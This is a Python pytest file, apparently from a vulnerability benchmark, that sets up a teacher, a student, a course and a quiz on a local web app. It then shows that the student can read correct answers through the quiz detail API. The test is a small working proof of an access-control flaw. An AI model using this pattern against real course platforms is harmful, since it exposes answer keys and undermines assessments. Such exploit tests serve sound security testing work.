import json
import requests


def api_url(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def json_of(resp):
    try:
        return resp.json()
    except Exception as exc:
        raise AssertionError(
            f"Expected JSON response, got status={resp.status_code}, body={resp.text}"
        ) from exc


def register(session: requests.Session, base_url: str, username: str, password: str, display_name: str):
    return session.post(
        api_url(base_url, "/api/auth/register"),
        json={
            "username": username,
            "password": password,
            "display_name": display_name,
        },
        timeout=10,
    )


def create_course(session: requests.Session, base_url: str, title: str, description: str):
    return session.post(
        api_url(base_url, "/api/courses"),
        json={"title": title, "description": description},
        timeout=10,
    )


def list_users(session: requests.Session, base_url: str):
    return session.get(api_url(base_url, "/api/users"), timeout=10)


def find_user_id_by_username(session: requests.Session, base_url: str, username: str):
    resp = list_users(session, base_url)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True
    for user in payload.get("users", []):
        if user.get("username") == username:
            return int(user["user_id"])
    return None


def add_member(session: requests.Session, base_url: str, course_id: int, user_id: int, role_in_course: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/members"),
        json={"user_id": user_id, "role_in_course": role_in_course},
        timeout=10,
    )


def create_question(session: requests.Session, base_url: str, course_id: int, qtype: str, prompt: str, options_json, answer_json):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/questions"),
        json={
            "qtype": qtype,
            "prompt": prompt,
            "options_json": options_json,
            "answer_json": answer_json,
        },
        timeout=10,
    )


def create_quiz(session: requests.Session, base_url: str, course_id: int, title: str, description: str, open_at: str = "", due_at: str = ""):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/quizzes"),
        json={
            "title": title,
            "description": description,
            "open_at": open_at,
            "due_at": due_at,
        },
        timeout=10,
    )


def configure_quiz_question(session: requests.Session, base_url: str, course_id: int, quiz_id: int, question_id: int, points: int, position: int):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/quizzes/{quiz_id}/questions"),
        json={
            "question_id": question_id,
            "points": points,
            "position": position,
        },
        timeout=10,
    )


def get_quiz(session: requests.Session, base_url: str, course_id: int, quiz_id: int):
    return session.get(
        api_url(base_url, f"/api/courses/{course_id}/quizzes/{quiz_id}"),
        timeout=10,
    )


def extract_questions(payload):
    questions = payload.get("questions")
    if isinstance(questions, list):
        return questions

    quiz = payload.get("quiz")
    if isinstance(quiz, dict):
        nested = quiz.get("questions")
        if isinstance(nested, list):
            return nested

    quiz_questions = payload.get("quiz_questions")
    if isinstance(quiz_questions, list):
        return quiz_questions

    data = payload.get("data")
    if isinstance(data, dict):
        nested = data.get("questions")
        if isinstance(nested, list):
            return nested

    raise AssertionError(f"Could not find questions list in payload: {payload}")


def get_answer_field(question):
    if "answer_json" in question:
        return question["answer_json"]
    if "answer" in question:
        return question["answer"]
    raise AssertionError(f"Could not find answer field in question payload: {question}")


def test_exploit_vuln_001_student_can_read_answer_json_from_quiz_detail_api(app_instance):
    """
    Exploit expectation:
    Any course member, including a student, can fetch quiz detail API data
    and receive the correct-answer payload for quiz questions.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    student = requests.Session()

    r = register(teacher, base_url, "quiz_teacher", "pass123", "Quiz Teacher")
    assert r.status_code == 201, r.text

    r = register(student, base_url, "quiz_student", "pass123", "Quiz Student")
    assert r.status_code == 201, r.text

    course_resp = create_course(teacher, base_url, "Quiz Exposure Course", "demo")
    assert course_resp.status_code == 201, course_resp.text
    course_id = int(json_of(course_resp)["course"]["course_id"])

    student_user_id = find_user_id_by_username(teacher, base_url, "quiz_student")
    assert student_user_id is not None

    add_resp = add_member(teacher, base_url, course_id, student_user_id, "student")
    assert add_resp.status_code == 201, add_resp.text

    answer_value = json.dumps({"correct": "4"})

    q_resp = create_question(
        teacher,
        base_url,
        course_id,
        "single_choice",
        "What is 2 + 2?",
        json.dumps(["3", "4", "5"]),
        answer_value,
    )
    assert q_resp.status_code == 201, q_resp.text
    question_id = int(json_of(q_resp)["question"]["question_id"])

    quiz_resp = create_quiz(
        teacher,
        base_url,
        course_id,
        "Math Quiz",
        "basic arithmetic quiz",
    )
    assert quiz_resp.status_code == 201, quiz_resp.text
    quiz_id = int(json_of(quiz_resp)["quiz"]["quiz_id"])

    cfg_resp = configure_quiz_question(
        teacher,
        base_url,
        course_id,
        quiz_id,
        question_id,
        points=5,
        position=1,
    )
    assert cfg_resp.status_code in (200, 201), cfg_resp.text

    leak_resp = get_quiz(student, base_url, course_id, quiz_id)
    assert leak_resp.status_code == 200, leak_resp.text
    payload = json_of(leak_resp)
    assert payload["success"] is True

    questions = extract_questions(payload)
    assert len(questions) >= 1

    leaked_question = questions[0]
    assert leaked_question["prompt"] == "What is 2 + 2?"

    leaked_answer = get_answer_field(leaked_question)
    assert leaked_answer is not None
    assert leaked_answer != ""
    assert "4" in str(leaked_answer)